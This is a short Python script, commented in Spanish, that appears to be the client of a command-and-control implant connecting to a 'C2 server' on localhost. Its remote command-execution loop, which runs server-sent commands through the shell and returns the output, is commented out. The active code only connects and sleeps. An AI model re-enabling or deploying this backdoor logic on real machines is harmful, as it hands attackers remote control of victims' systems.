import socket
import subprocess
import time

HOST = '127.0.0.1'  # Servidor C2
PORT = 8000        # Puerto del servidor

def enviar_comando(s, comando):
    """Envia un comando al servidor y recibe la respuesta."""
    s.sendall(comando.encode())
    data = s.recv(1024)
    return data.decode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((HOST, PORT))
        print(f"Conectado al servidor C2 en {HOST}:{PORT}")
        while True:
            #Comentar o Eliminar la parte de ejecutar comandos del servidor
            #data = s.recv(1024)
            #if not data:
            #    break
            #comando = data.decode()
            #print(f"Ejecutando comando: {comando}")
            #try:
            #    resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT).decode()
            #    s.sendall(resultado.encode())
            #except subprocess.CalledProcessError as e:
            #    s.sendall(f"Error: {e.output.decode()}".encode())
            time.sleep(2) #Pausa para evitar consumo excesivo de CPU
    except Exception as e:
        print(f"Error de conexión: {e}")
